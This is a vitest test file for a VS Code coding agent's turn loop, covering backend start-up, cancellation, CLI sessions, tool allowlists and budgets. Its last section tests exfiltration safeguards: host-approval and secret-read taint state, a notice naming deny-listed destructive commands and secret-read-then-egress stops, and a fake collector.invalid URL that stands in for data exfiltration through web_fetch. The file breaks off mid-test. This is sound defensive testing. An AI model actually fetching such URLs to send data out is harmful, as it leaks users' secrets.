import { afterEach, describe, expect, it, vi } from 'vitest';
import { AgentLoop, type SidebarProviderEvents } from '../../src/sidebar/AgentLoop';
import type { IBackendPool } from '../../src/backend/BackendPool';
import type { BackendController } from '../../src/backend/BackendController';
import type { ForgeConfig, ModelConfig } from '../../src/config/types';
import type { ConversationRuntime } from '../../src/sidebar/sessionTypes';
import type { CheckpointStack } from '../../src/checkpoint/CheckpointStack';
import type { KeepUndoCodeLensProvider } from '../../src/sidebar/KeepUndoCodeLens';
import type { ToolFailureTracker } from '../../src/tools/StripTools';
import type { DiffDecorations } from '../../src/sidebar/DiffDecorations';
import { ToolRegistry } from '../../src/tools/ToolRegistry';
import { makeWebFetchTool } from '../../src/tools/fetchTool';
import { unattendedConversations } from '../../src/sidebar/unattendedConversations';
import { partialToolPath } from '../../src/sidebar/toolCallProgress';
import type { CliAgentDriver } from '../../src/agents/CliAgentDriver';
import type { AgentProgressEvent } from '../../src/sidebar/AgentProgress';
import { fakeClaudeCli } from '../support/fakeCli';
import * as path from 'path';
import { TemplateEngine } from '../../src/llm/TemplateEngine';
import {
  approvedHostsFor,
  clearConversationHostApprovals,
  markHostApproved,
} from '../../src/tools/fetchHostApprovals';
import {
  clearConversationSecretState,
  hasConversationReadSecret,
  markConversationReadSecret,
} from '../../src/tools/exfilTaint';
import { armNewConversationByDefault } from '../../src/sidebar/chatClanker';

const FAKE_CLAUDE_CLI = fakeClaudeCli();

const { streamModelChatCompletion, inspectRuntimeModelCapabilities } = vi.hoisted(() => ({
  streamModelChatCompletion: vi.fn(),
  inspectRuntimeModelCapabilities: vi.fn().mockResolvedValue({}),
}));

vi.mock('vscode', () => ({
  window: {
    activeTextEditor: undefined,
    createOutputChannel: vi.fn(() => ({
      appendLine: vi.fn(),
      trace: vi.fn(),
      debug: vi.fn(),
      info: vi.fn(),
      warn: vi.fn(),
      error: vi.fn(),
      show: vi.fn(),
      dispose: vi.fn(),
    })),
    showWarningMessage: vi.fn(),
  },
}));

vi.mock('../../src/llm/ChatClient', () => ({
  streamModelChatCompletion,
}));

vi.mock('../../src/backend/ModelCapabilities', () => ({
  inspectRuntimeModelCapabilities,
}));

function makeConfig(model: Partial<ModelConfig> = {}): ForgeConfig {
  return {
    models: [
      {
        name: 'test-model',
        provider: 'llama.cpp',
        gguf_path: '/models/test.gguf',
        num_ctx: 131_072,
        spawn: { n_parallel: 1 },
        ...model,
      },
    ],
    active_model: 'test-model',
    llama_server: {},
  } as ForgeConfig;
}

function makeConversation(): ConversationRuntime {
  return {
    id: 'conv-1',
    title: 'Chat',
    createdAt: 1,
    updatedAt: 1,
    messages: [],
  };
}

function makeBackend(): BackendController {
  return {
    start: async () => {},
    stop: async () => {},
    showConsole: () => {},
    isReady: () => true,
    baseUrl: () => 'http://127.0.0.1:8080',
    loadedModel: () => 'test-model',
    hotSwap: async () => {},
    applyForgeConfig: () => {},
  };
}

function makePool(
  acquireImpl?: (modelName: string) => Promise<BackendController>,
  /** Is this model being served right now? The real pool answers it for its
   *  own surfaces (`sidebarPayloads.ts`, `contactPrompt.ts`); the fake keeps
   *  the method so the harness still matches `IBackendPool`. Default `false`:
   *  nothing is loaded, which is what every case here assumes.
   */
  modelReady = false,
): IBackendPool {
  return {
    acquire: acquireImpl ?? (async () => makeBackend()),
    canDelegate: () => ({ ok: false, reason: 'unsupported' }) as never,
    acquireForDelegation: async () => {
      throw new Error('acquireForDelegation not supported in this fake');
    },
    parallelCapacity: () => 1,
    release: async () => {},
    stopAll: async () => {},
    applyForgeConfig: () => {},
    showConsole: () => {},
    isAnyReady: () => false,
    loadedModelNames: () => [],
    loadedModelsExcept: () => [],
    isLoaded: () => false,
    isModelReady: () => modelReady,
    backendProcesses: () => [],
    residencySignature: () => '',
  };
}

function makeLoop(
  pool: IBackendPool,
  config: ForgeConfig,
  post: (message: unknown) => void = vi.fn(),
  registry: ToolRegistry = new ToolRegistry(),
  cliDriver?: CliAgentDriver,
  checkpointsOverride?: CheckpointStack,
): AgentLoop {
  const checkpoint = {
    snapshotBefore: vi.fn(),
    snapshotMissingBefore: vi.fn(),
    prepareWorkspace: vi.fn(async () => ({
      finish: vi.fn(async () => {}),
      discard: vi.fn(async () => {}),
    })),
  };
  const checkpoints =
    checkpointsOverride ??
    ({
      beginTurn: vi.fn(() => checkpoint),
      commitTurn: vi.fn(),
      depth: vi.fn().mockReturnValue(0),
    } as unknown as CheckpointStack);

  const codeLens = {
    markPending: vi.fn(),
    clearPending: vi.fn(),
  } as unknown as KeepUndoCodeLensProvider;

  const diffDecorations = {} as DiffDecorations;
  const failureTracker = {
    shouldStrip: vi.fn().mockReturnValue(false),
    reset: vi.fn(),
    record: vi.fn(),
  } as unknown as ToolFailureTracker;

  const events: SidebarProviderEvents = {
    onBackendError: vi.fn(),
    onBackendReady: vi.fn(),
    onGenerationStarted: vi.fn(),
    onGenerationFinished: vi.fn(),
  };

  return new AgentLoop(
    pool,
    () => config,
    registry,
    checkpoints,
    codeLens,
    diffDecorations,
    failureTracker,
    events,
    post,
    () => undefined,
    new TemplateEngine(path.join(__dirname, '..', '..', 'config', 'templates', 'builtin')),
    undefined,
    undefined,
    process.cwd(),
    undefined,
    cliDriver,
  );
}

function postedTypes(post: ReturnType<typeof vi.fn>): string[] {
  return post.mock.calls.map(([m]) => (m as { type?: string }).type ?? '');
}

/** Streams nothing and ends the turn, so a test can assert on the turn's edges. */
function completeTurnImmediately(): void {
  streamModelChatCompletion.mockImplementation(
    (
      _baseUrl: string,
      _request: unknown,
      _model: ModelConfig,
      handlers: { onDone: (reason: string | null) => void; onToolCalls: (c: unknown[] | null) => void },
    ) => {
      handlers.onToolCalls(null);
      handlers.onDone('stop');
      return Promise.resolve();
    },
  );
}

describe('AgentLoop', () => {
  it('extracts a path only after the partial JSON string closes', () => {
    expect(partialToolPath('{"path":"src/a')).toBeUndefined();
    expect(partialToolPath('{"other_path":"wrong","path":"src/a.ts","content":"x')).toBe('src/a.ts');
    expect(partialToolPath('{"path":"a\\\"b.ts"}')).toBe('a"b.ts');
  });
  afterEach(() => {
    vi.clearAllMocks();
  });

  it('does not commit a user prompt when backend startup fails', async () => {
    const conv = makeConversation();
    const config = makeConfig();
    const loop = makeLoop(
      makePool(async () => {
        throw new Error('offline');
      }),
      config,
    );

    await loop.runTurn(conv, config.models[0]!, 'hello while offline');

    expect(conv.messages).toHaveLength(0);
    expect(conv.title).toBe('Chat');
  });

  it('marks a Forge-authored prompt internal instead of dropping the flag', async () => {
    completeTurnImmediately();
    const conv = makeConversation();
    const config = makeConfig();
    const loop = makeLoop(makePool(), config);

    await loop.runTurn(conv, config.models[0]!, 'Continue the active task.', undefined, {
      internal: true,
    });

    // The wiring adapter used to be written with three parameters against a
    // four-parameter signature, which type-checks and silently discards this.
    // Every compaction resume prompt then looked user-authored, and the
    // verbatim user-request block replayed it back as an instruction.
    expect(conv.messages[0]?.internal).toBe(true);
  });

  it('keeps the policy-default notice out of the exact model request messages', async () => {
    const config = makeConfig();
    config.models[0]!.system_prompt = 'test system prompt';
    config.models[0]!.system_prompt_mode = 'replace';
    const conv = makeConversation();
    const notice = armNewConversationByDefault(conv, '2999-01-01T00:00', Date.now());
    const requests: unknown[][] = [];
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        request: unknown,
        _model: ModelConfig,
        handlers: {
          onDone: (reason: string | null) => void;
          onToolCalls: (calls: unknown[] | null) => void;
        },
      ) => {
        requests.push((request as { messages: unknown[] }).messages);
        handlers.onToolCalls(null);
        handlers.onDone('stop');
        return Promise.resolve();
      },
    );
    const loop = makeLoop(makePool(), config);

    await loop.runTurn(conv, config.models[0]!, 'student prompt');

    expect(notice).toBe(
      'Clanker is on by default until 2999-01-01 00:00 (policy.yaml clanker.default_on_until). Its three stops still hold: deny-listed destructive shell commands, Forge guard files, a secret read followed by egress. Turn it off here with /clanker.',
    );
    expect(requests).toEqual([
      [
        { role: 'system', content: 'test system prompt' },
        {
          role: 'user',
          content: expect.stringMatching(/student prompt$/u),
          createdAt: expect.any(Number),
          turnContext: expect.any(String),
        },
      ],
    ]);
  });

  it('leaves a prompt the user typed unmarked', async () => {
    completeTurnImmediately();
    const conv = makeConversation();
    const config = makeConfig();
    const loop = makeLoop(makePool(), config);

    await loop.runTurn(conv, config.models[0]!, 'a real prompt');

    expect(conv.messages[0]?.internal).toBeUndefined();
  });

  it('announces the turn on the progress bus before anything it says (audit F4)', async () => {
    completeTurnImmediately();
    const conv = makeConversation();
    const config = makeConfig();
    const loop = makeLoop(makePool(), config);
    const seen: AgentProgressEvent[] = [];
    const subscription = loop.onAgentProgress((event) => seen.push(event));

    await loop.runTurn(conv, config.models[0]!, 'a timed prompt');
    subscription.dispose();

    // A turn that names no tool and says nothing emits only its closing event,
    // so without this the bus could not tell when it began and reported every
    // such turn as lasting 0 s. The start has to come first: a snapshot built
    // from a later event cannot know when the turn started.
    expect(seen.filter((event) => event.kind === 'start')).toHaveLength(1);
    expect(seen[0]?.kind).toBe('start');
    expect(seen[0]?.conversationId).toBe(conv.id);

    // An `internal` send is the auto-compaction resume of the task already
    // running - the same boundary `midTurnTells.onTaskStart` uses - so it must
    // not open a second turn.
    const resume: AgentProgressEvent[] = [];
    const second = loop.onAgentProgress((event) => resume.push(event));
    await loop.runTurn(conv, config.models[0]!, 'Continue the active task.', undefined, {
      internal: true,
    });
    second.dispose();
    expect(resume.filter((event) => event.kind === 'start')).toHaveLength(0);
  }, 20_000);

  it('says nothing about starting a backend the warm pool hands over instantly', async () => {
    completeTurnImmediately();
    const config = makeConfig();
    const post = vi.fn();
    const loop = makeLoop(makePool(), config, post);

    await loop.runTurn(makeConversation(), config.models[0]!, 'warm prompt');

    // Two permanent transcript rows per prompt, describing an acquire that took
    // no measurable time, was the whole complaint.
    expect(postedTypes(post)).not.toContain('backendStarting');
    expect(postedTypes(post)).toContain('ready');
  });

  it('announces a start once the acquire outlasts the notice window', async () => {
    completeTurnImmediately();
    vi.useFakeTimers();
    try {
      let release: (() => void) | undefined;
      const held = new Promise<BackendController>((resolve) => {
        release = () => resolve(makeBackend());
      });
      const config = makeConfig();
      const post = vi.fn();
      const loop = makeLoop(makePool(() => held), config, post);

      const turn = loop.runTurn(makeConversation(), config.models[0]!, 'cold prompt');
      await vi.advanceTimersByTimeAsync(600);
      expect(postedTypes(post)).toContain('backendStarting');

      release?.();
      // Back to real timers before awaiting: the turn itself schedules
      // intervals that a fake clock would run forever.
      vi.useRealTimers();
      await turn;
      expect(postedTypes(post)).toContain('ready');
    } finally {
      vi.useRealTimers();
    }
  });

  it('posts cancelled done when Stop arrives during local backend acquisition', async () => {
    let release: (() => void) | undefined;
    const held = new Promise<BackendController>((resolve) => {
      release = () => resolve(makeBackend());
    });
    const config = makeConfig();
    const conv = makeConversation();
    const post = vi.fn();
    const acquire = vi.fn(() => held);
    const loop = makeLoop(makePool(acquire), config, post);
    const turn = loop.runTurn(conv, config.models[0]!, 'cold prompt');
    await vi.waitFor(() => expect(acquire).toHaveBeenCalledOnce());
    const stop = loop.cancel(conv.id);
    release?.();
    await stop;
    expect((await turn).kind).toBe('cancelled');
    expect(post).toHaveBeenCalledWith(expect.objectContaining({
      type: 'done', finishReason: 'cancelled', conversationId: conv.id,
    }));
  });

  it('waits for a cancelled turn to settle before allowing a new backend acquire', async () => {
    let finishTurn: (() => void) | undefined;
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        _request: unknown,
        _model: ModelConfig,
        handlers: {
          onDone: (reason: string | null) => void;
          onToolCalls: (calls: unknown[] | null) => void;
        },
      ) => {
        finishTurn = () => {
          handlers.onToolCalls(null);
          handlers.onDone('stop');
        };
        return Promise.resolve();
      },
    );
    const conv = makeConversation();
    const config = makeConfig();
    const post = vi.fn();
    const loop = makeLoop(makePool(), config, post);

    const firstTurn = loop.runTurn(conv, config.models[0]!, 'slow prompt');
    await vi.waitFor(() => expect(loop.isStreamingConv(conv.id)).toBe(true));

    const cancellation = loop.cancel(conv.id);
    let barrierPassed = false;
    const barrier = loop.waitForCancelledTurns().then(() => {
      barrierPassed = true;
    });
    await Promise.resolve();
    expect(barrierPassed).toBe(false);

    finishTurn?.();
    await cancellation;
    expect((await firstTurn).kind).toBe('cancelled');
    await barrier;
    expect(barrierPassed).toBe(true);
    expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'done', finishReason: 'cancelled', conversationId: conv.id }));
  });

  it('cancels a compaction prompt owned by the selected conversation', async () => {
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        _request: unknown,
        _model: ModelConfig,
        handlers: { onDone: (reason: string | null) => void },
        signal: AbortSignal,
      ) => {
        signal.addEventListener('abort', () => handlers.onDone('cancelled'), { once: true });
      },
    );
    const conv = makeConversation();
    const loop = makeLoop(makePool(), makeConfig());

    const compact = loop.runPromptToMarkdown('summarize the conversation', conv.id);
    await vi.waitFor(() => expect(streamModelChatCompletion).toHaveBeenCalledOnce());
    await loop.cancel(conv.id);
    await expect(compact).resolves.toBe('');
  });

  it('forwards tool argument progress with the exact bridge fields', async () => {
    streamModelChatCompletion.mockImplementation((
      _url: string, _request: unknown, _model: ModelConfig,
      handlers: {
        onToolCallProgress?: (progress: {
          index: number; id: string; name: string; arguments: string; argDeltas: number;
        }) => void;
        onDone: (reason: string) => void;
      },
    ) => {
      handlers.onToolCallProgress?.({
        index: 2, id: 'call-2', name: 'write_file',
        arguments: '{"path":"src/a.ts","content":"unfinished', argDeltas: 17,
      });
      handlers.onDone('stop');
    });
    const config = makeConfig();
    const post = vi.fn();
    const loop = makeLoop(makePool(), config, post);
    await loop.runTurn(makeConversation(), config.models[0]!, 'write');
    expect(post).toHaveBeenCalledWith({
      type: 'toolCallProgress', conversationId: 'conv-1', index: 2,
      toolCallId: 'call-2', toolName: 'write_file', target: 'src/a.ts', tokens: 17,
    });
  });

  it('commits a user prompt once the backend is ready and the turn begins', async () => {
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        _request: unknown,
        _model: ModelConfig,
        handlers: {
          onToken: (token: string) => void;
          onDone: (reason: string | null) => void;
          onError: (error: Error) => void;
          onToolCalls: (calls: unknown[] | null) => void;
        },
      ) => {
        handlers.onToken('hi');
        handlers.onToolCalls(null);
        handlers.onDone('stop');
      },
    );

    const conv = makeConversation();
    const config = makeConfig();
    const loop = makeLoop(makePool(), config);

    await loop.runTurn(conv, config.models[0]!, 'hello once connected');

    expect(conv.messages).toHaveLength(2);
    expect(conv.messages[0]).toMatchObject({ role: 'user', content: 'hello once connected' });
    expect(conv.messages[1]).toMatchObject({ role: 'assistant', content: 'hi' });
    expect(conv.title).toBe('hello once connected');
  });

  it('runs a CLI model as a direct sidebar conversation without a backend', async () => {
    const run = vi.fn(async (options: Parameters<CliAgentDriver['run']>[0]) => {
      options.onEvent?.({ kind: 'status', text: '[codex: edit src/foo.ts]' });
      options.onEvent?.({ kind: 'text', text: 'Implemented it.' });
      return { status: 'completed' as const, finalText: 'Implemented it.' };
    });
    const driver = { run } as unknown as CliAgentDriver;
    const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI });
    const conv = makeConversation();
    const acquire = vi.fn(async () => makeBackend());
    const post = vi.fn();
    const loop = makeLoop(makePool(acquire), config, post, new ToolRegistry(), driver);

    await loop.runTurn(conv, config.models[0]!, 'please implement this');

    expect(acquire).not.toHaveBeenCalled();
    expect(run).toHaveBeenCalledWith(
      expect.objectContaining({ cwd: process.cwd() }),
    );
    expect(conv.messages).toEqual([
      expect.objectContaining({
        role: 'user',
        content: 'please implement this',
        createdAt: expect.any(Number),
      }),
      {
        role: 'tool',
        content: '[codex: edit src/foo.ts]',
        name: 'claude',
      },
      expect.objectContaining({
        role: 'assistant',
        content: 'Implemented it.',
        createdAt: expect.any(Number),
      }),
    ]);
    expect(post).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'toolActivity',
        toolName: 'claude',
        detail: '[codex: edit src/foo.ts]',
      }),
    );
    expect(post).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'done', finishReason: 'stop' }),
    );
  });

  it('posts cancelled done when a CLI stop races with a completed driver result', async () => {
    let finish: (() => void) | undefined;
    const run = vi.fn(async () => {
      await new Promise<void>((resolve) => { finish = resolve; });
      return { status: 'completed' as const, finalText: '' };
    });
    const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI });
    const conv = makeConversation();
    const post = vi.fn();
    const loop = makeLoop(makePool(), config, post, new ToolRegistry(), { run } as unknown as CliAgentDriver);
    const turn = loop.runTurn(conv, config.models[0]!, 'stop this');
    await vi.waitFor(() => expect(run).toHaveBeenCalledOnce());
    const stop = loop.cancel(conv.id);
    finish?.();
    await stop;
    expect((await turn).kind).toBe('cancelled');
    expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'done', finishReason: 'cancelled', conversationId: conv.id }));
  });

  it('runs direct CLI chat without invoking Forge rollback preparation', async () => {
    const run = vi.fn(async () => ({ status: 'completed' as const, finalText: 'Done.' }));
    const driver = { run } as unknown as CliAgentDriver;
    const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI });
    const conv = makeConversation();
    const post = vi.fn();
    const checkpoints = {
      beginTurn: vi.fn(() => {
        throw new Error('direct CLI chat must not prepare a checkpoint');
      }),
      commitTurn: vi.fn(),
      depth: vi.fn().mockReturnValue(0),
    } as unknown as CheckpointStack;
    const loop = makeLoop(makePool(), config, post, new ToolRegistry(), driver, checkpoints);

    await loop.runTurn(conv, config.models[0]!, 'run this');

    expect(run).toHaveBeenCalledOnce();
    expect(checkpoints.beginTurn).not.toHaveBeenCalled();
    expect(checkpoints.commitTurn).not.toHaveBeenCalled();
    expect(conv.messages.some((message) => message.role === 'user')).toBe(true);
    expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'ready' }));
  });

  it('reuses the CLI session for later turns in the same Forge conversation', async () => {
    const run = vi
      .fn()
      .mockResolvedValueOnce({
        status: 'completed' as const,
        finalText: 'First answer',
        sessionId: 'persistent-session',
      })
      .mockResolvedValueOnce({
        status: 'completed' as const,
        finalText: 'Second answer',
        sessionId: 'persistent-session',
      });
    const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI, cli_model: 'opus' });
    const conv = makeConversation();
    const loop = makeLoop(
      makePool(vi.fn(async () => makeBackend())),
      config,
      vi.fn(),
      new ToolRegistry(),
      { run } as unknown as CliAgentDriver,
    );

    await loop.runTurn(conv, config.models[0]!, 'first prompt');
    await loop.runTurn(conv, config.models[0]!, 'second prompt');

    expect(conv.cli_sessions?.[config.models[0]!.name]).toBe('persistent-session');
    expect(run.mock.calls[0]?.[0]).not.toHaveProperty('sessionId');
    expect(run.mock.calls[1]?.[0]).toEqual(
      expect.objectContaining({
        task: expect.stringContaining('second prompt'),
        sessionId: 'persistent-session',
        model: 'opus',
      }),
    );
  });

  it('announces backend start/ready only on the first CLI turn, not on resumes', async () => {
    const run = vi
      .fn()
      .mockResolvedValueOnce({
        status: 'completed' as const,
        finalText: 'First answer',
        sessionId: 'warm-session',
      })
      .mockResolvedValueOnce({ status: 'completed' as const, finalText: 'Second answer' });
    const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI, cli_model: 'opus' });
    const conv = makeConversation();
    const post = vi.fn();
    const loop = makeLoop(
      makePool(vi.fn(async () => makeBackend())),
      config,
      post,
      new ToolRegistry(),
      { run } as unknown as CliAgentDriver,
    );

    const countType = (type: string): number =>
      post.mock.calls.filter(([m]) => (m as { type?: string }).type === type).length;

    await loop.runTurn(conv, config.models[0]!, 'first prompt');
    const startsAfterFirst = countType('backendStarting');
    const readysAfterFirst = countType('ready');

    await loop.runTurn(conv, config.models[0]!, 'second prompt');

    expect(startsAfterFirst).toBe(1);
    expect(readysAfterFirst).toBe(1);
    // Resumed turn adds no further start/ready chatter or checkpoint activity.
    expect(countType('backendStarting')).toBe(1);
    expect(countType('ready')).toBe(1);
    expect(countType('checkpointReady')).toBe(0);
    expect(
      post.mock.calls.some(([m]) =>
        /rollback checkpoint/i.test((m as { detail?: string }).detail ?? ''),
      ),
    ).toBe(false);
  });

  it('runs a second CLI conversation while the first conversation is still waiting', async () => {
    let finishFirst: (() => void) | undefined;
    const firstBlocked = new Promise<void>((resolve) => {
      finishFirst = resolve;
    });
    const run = vi
      .fn()
      .mockImplementationOnce(async () => {
        await firstBlocked;
        return { status: 'completed' as const, finalText: 'First finished' };
      })
      .mockResolvedValueOnce({ status: 'completed' as const, finalText: 'Second finished' });
    const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI });
    const first = makeConversation();
    const second = { ...makeConversation(), id: 'conversation-2', messages: [] };
    const loop = makeLoop(
      makePool(vi.fn(async () => makeBackend())),
      config,
      vi.fn(),
      new ToolRegistry(),
      { run } as unknown as CliAgentDriver,
    );

    const firstTurn = loop.runTurn(first, config.models[0]!, 'slow prompt');
    await vi.waitFor(() => expect(run).toHaveBeenCalledTimes(1));
    await loop.runTurn(second, config.models[0]!, 'independent prompt');

    expect(second.messages).toContainEqual(
      expect.objectContaining({
        role: 'assistant',
        content: 'Second finished',
        createdAt: expect.any(Number),
      }),
    );
    expect(first.messages).toHaveLength(1);
    finishFirst?.();
    await firstTurn;
    expect(first.messages).toContainEqual(
      expect.objectContaining({
        role: 'assistant',
        content: 'First finished',
        createdAt: expect.any(Number),
      }),
    );
  });

  it('rejects image input with an actionable setup message for a text-only model', async () => {
    const conv = makeConversation();
    const config = makeConfig();
    const acquire = vi.fn(async () => makeBackend());
    const post = vi.fn();
    const loop = makeLoop(makePool(acquire), config, post);

    await loop.runTurn(conv, config.models[0]!, 'inspect this', [
      { name: 'fixture.png', mediaType: 'image/png', data: 'aW1hZ2U=' },
    ]);

    expect(acquire).not.toHaveBeenCalled();
    expect(conv.messages).toHaveLength(0);
    expect(post).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'error',
        conversationId: conv.id,
        message: expect.stringMatching(/vision-capable model.*mmproj_path/s),
      }),
    );
  });

  it('advertises only the resolved model tools allowlist to the backend', async () => {
    let capturedTools: Array<{ function: { name: string } }> | undefined;
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        request: { tools?: Array<{ function: { name: string } }> },
        _model: ModelConfig,
        handlers: {
          onToken: (token: string) => void;
          onDone: (reason: string | null) => void;
          onError: (error: Error) => void;
          onToolCalls: (calls: unknown[] | null) => void;
        },
      ) => {
        capturedTools = request.tools;
        handlers.onToken('hi');
        handlers.onToolCalls(null);
        handlers.onDone('stop');
      },
    );

    const registry = new ToolRegistry();
    registry.register({
      definition: {
        type: 'function',
        function: { name: 'read_file', description: 'read', parameters: { type: 'object' } },
      },
      permission: 'read',
      handler: vi.fn().mockResolvedValue('contents'),
    });
    registry.register({
      definition: {
        type: 'function',
        function: { name: 'budget_test_tool', description: 'exec', parameters: { type: 'object' } },
      },
      permission: 'terminal',
      handler: vi.fn().mockResolvedValue('ran'),
    });

    const conv = makeConversation();
    const config = makeConfig({ tools: ['read_file'] });
    const loop = makeLoop(makePool(), config, vi.fn(), registry);

    await loop.runTurn(conv, config.models[0]!, 'list allowed tools');

    expect(capturedTools?.map((t) => t.function.name)).toEqual(['read_file']);
  });

  it('blocks non-allowlisted dispatch and returns the wrap-up message once a per-turn budget is spent', async () => {
    let round = 0;
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        _request: unknown,
        _model: ModelConfig,
        handlers: {
          onToken: (token: string) => void;
          onDone: (reason: string | null) => void;
          onError: (error: Error) => void;
          onToolCalls: (calls: unknown[] | null) => void;
        },
      ) => {
        round++;
        if (round <= 2) {
          handlers.onToolCalls([
            {
              id: `call-${round}`,
              type: 'function',
              function: { name: 'budget_test_tool', arguments: '{}' },
            },
          ]);
          handlers.onDone('tool_calls');
        } else {
          handlers.onToken('wrapped up');
          handlers.onToolCalls(null);
          handlers.onDone('stop');
        }
      },
    );

    const registry = new ToolRegistry();
    registry.register({
      definition: {
        type: 'function',
        function: { name: 'budget_test_tool', description: 'exec', parameters: { type: 'object' } },
      },
      permission: 'terminal',
      handler: vi.fn().mockResolvedValue('ran'),
    });

    const conv = makeConversation();
    const config = makeConfig({ tool_call_limits: { budget_test_tool: 1 } });
    const loop = makeLoop(makePool(), config, vi.fn(), registry);
    loop.setClankerMode(conv.id, true); // bypass the confirm-UI gate; unrelated to the budget under test

    await loop.runTurn(conv, config.models[0]!, 'run it twice');

    const toolMessages = conv.messages.filter((m) => m.role === 'tool');
    expect(toolMessages).toHaveLength(2);
    expect(toolMessages[0]?.content).toBe('ran');
    expect(toolMessages[1]?.content).toBe(
      'Budget exhausted: budget_test_tool was limited to 1 calls this turn (1 used). ' +
        'Do not call it again; wrap up with what you have.',
    );
  });

  it('reports context growth once per tool round instead of only at the end of the turn', async () => {
    // The ctx bar and the HalluMeter bridge used to sit frozen for the whole
    // turn: a run that pulled tens of thousands of tokens through several tool
    // rounds showed the pre-turn number until it finished. The tick now rides
    // the server's usage frame, because that is the only thing the bar shows.
    let round = 0;
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        _request: unknown,
        _model: ModelConfig,
        handlers: {
          onToken: (token: string) => void;
          onDone: (reason: string | null) => void;
          onToolCalls: (calls: unknown[] | null) => void;
          onUsage?: (usage: {
            prompt_tokens: number;
            completion_tokens: number;
            total_tokens: number;
          }) => void;
        },
      ) => {
        round++;
        handlers.onUsage?.({
          prompt_tokens: 1000 * round,
          completion_tokens: 10,
          total_tokens: 1000 * round + 10,
        });
        if (round <= 2) {
          handlers.onToolCalls([
            {
              id: `call-${round}`,
              type: 'function',
              function: { name: 'read_file', arguments: '{}' },
            },
          ]);
          handlers.onDone('tool_calls');
        } else {
          handlers.onToken('done');
          handlers.onToolCalls(null);
          handlers.onDone('stop');
        }
      },
    );

    const registry = new ToolRegistry();
    registry.register({
      definition: {
        type: 'function',
        function: { name: 'read_file', description: 'read', parameters: { type: 'object' } },
      },
      permission: 'read',
      handler: vi.fn().mockResolvedValue('file contents'),
    });

    const conv = makeConversation();
    const config = makeConfig();
    const loop = makeLoop(makePool(), config, vi.fn(), registry);
    const ticks: string[] = [];
    loop.setContextChangedListener((convId) => ticks.push(convId));

    await loop.runTurn(conv, config.models[0]!, 'read two files');

    // One tick per usage frame (three rounds) plus the end-of-turn publish,
    // all scoped to this conversation.
    expect(ticks).toEqual(['conv-1', 'conv-1', 'conv-1', 'conv-1']);
    // The conversation carries the last request's counters, which is what every
    // context display reads.
    expect(conv.last_input_tokens).toBe(3000);
    expect(conv.last_output_tokens).toBe(10);
    expect(conv.model_request_count).toBe(3);
  });
});

// The hosts this chat approved and the "this chat has read a secret" flag are
// chat-scoped, like the history: the lifecycle ledger in
// docs/plans/EXFIL_GATES_PLAN.md says they go with the chat when it closes, not
// only when `/clearChat` runs. Left behind, a closed chat's taint would gate a
// brand-new chat for a read it never made, and its approved hosts would let a
// new chat reach a collector nobody was asked about.
describe('closing a chat drops what belonged to it', () => {
  afterEach(() => {
    clearConversationHostApprovals();
    clearConversationSecretState();
  });

  it('clears the hosts it approved and the secret-read flag', async () => {
    const conversation = makeConversation();
    conversation.id = 'conv-close';
    conversation.latestPeerWriter = { id: 'peer-chat', title: 'peer Worker' };
    const loop = makeLoop(makePool(), makeConfig());
    loop.setConversationLookup((id) => (id === conversation.id ? conversation : undefined));
    markHostApproved('conv-close', 'pypi.org');
    markConversationReadSecret('conv-close');
    expect(approvedHostsFor('conv-close')).toEqual(['pypi.org']);
    await loop.disposeConversation('conv-close');
    expect(approvedHostsFor('conv-close')).toEqual([]);
    expect(hasConversationReadSecret('conv-close')).toBe(false);
    expect(conversation.latestPeerWriter).toBeUndefined();
  });
});

// The card's own reason and alternative have to reach the refusal. `ToolDispatch`
// passes the gate's `gateKind`, `cardReason`, decline alternative and decision
// callback as a SIXTH argument to the approval adapter; an adapter written with
// five parameters against that signature type-checks and silently drops all four.
// The live security test of 2026-10-28 caught it from outside (case 7): a
// dangerous `web_fetch` lost its reason line, so the answer was made about a
// card whose whole point had been stripped. Asserted through `AgentLoop`
// because that is where the wiring lives; a test that builds its own adapter
// would pass whatever the wiring did.
describe('an unattended run refuses the gate in the gate\'s own words', () => {
  const PAYLOAD_URL = `https://collector.invalid/?d=${'a'.repeat(48) + '1'.repeat(48)}`;

  it('refuses at once naming the reason and the alternative, and asks no model', async () => {
    const conv = makeConversation();
    const config = {
      ...makeConfig(),
      permissions: { net: { fetch: true } },
    } as ForgeConfig;
    const registry = new ToolRegistry();
    // The production gate, not a hand-written card: `fetchApprovalFor` is what
    // decides this URL is dangerous and writes the reason and the alternative
    // this test then looks for.
    registry.register(makeWebFetchTool({ getConfig: () => config }));
    const loop = makeLoop(makePool(), config, vi.fn(), registry);

    let judgeRounds = 0;
    let agentRounds = 0;
    streamModelChatCompletion.mockImplementation(
      (
        _baseUrl: string,
        request: unknown,
        _model: ModelConfig,
        handlers: {
          onToken?: (text: string) => void;
          onDone: (reason: string | null) => void;
          onToolCalls?: (calls: unknown[] | null) => void;
        },
      ) => {
        const messages =
          (request as { messages?: { role: string; content: string }[] })?.messages ?? [];
        const text = messages.map((message) => String(message.content ?? '')).join('\n');
        if (text.includes('approval judge')) judgeRounds += 1;
        agentRounds += 1;
        if (agentRounds === 1) {
          handlers.onToolCalls?.([
            {
              id: 'call-1',
              type: 'function',
              function: { name: 'web_fetch', arguments: JSON.stringify({ url: PAYLOAD_URL }) },
            },
          ]);
          handlers.onDone('tool_calls');
        } else {
          handlers.onToken?.('carrying on without it');
          handlers.onDone('stop');
        }
        return Promise.resolve();
      },
    );

    // Unattended, because that is where the dropped argument showed itself
